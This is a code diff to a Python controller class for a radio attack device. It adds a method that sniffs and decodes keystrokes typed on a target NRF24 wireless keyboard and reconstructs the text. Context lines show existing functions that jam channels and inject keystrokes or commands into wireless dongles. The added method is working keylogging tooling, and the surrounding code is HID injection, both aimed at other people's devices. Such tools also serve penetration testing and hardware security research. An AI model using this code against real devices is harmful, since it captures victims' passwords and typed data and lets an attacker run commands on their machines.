@@ -283,6 +283,21 @@ class Companion:
         """Constant-carrier jam one channel for `secs` (via `nrf hijack .. jam`)."""
         return self.request(f"nrf hijack 0000000000 {ch} jam {secs}", timeout=secs + 8)
 
+    def nrf_readkeys(self, addr, ch, secs=10, timeout=None):
+        """Sniff + decode HID keystrokes from a target NRF24 device (cleartext +
+        Microsoft XOR). Returns dict(lines, keys, text) where `text` is the
+        reconstructed typed string from the [KEY] lines."""
+        import re
+        r = self.request(f"nrf readkeys {addr} {ch} {int(secs)}",
+                         timeout=timeout or (secs + 10))
+        keys = []
+        for ln in r.lines:
+            m = re.search(r"\[KEY(?:/ms)?\]\s+(.+?)\s+\(", ln)
+            if m:
+                keys.append(m.group(1))
+        text = "".join("\n" if k == "\\n" else (k if not k.startswith("[") else "") for k in keys)
+        return {"lines": r.lines, "keys": keys, "text": text, "ok": r.ok}
+
     def nrf_hijack(self, addr, ch, action="calc", arg="", proto="logi", timeout=20.0):
         """HID inject against an NRF24 dongle. action: type|run|calc|cmd|jam.
         `arg` is a single token (text for type, command for run, seconds for jam)."""
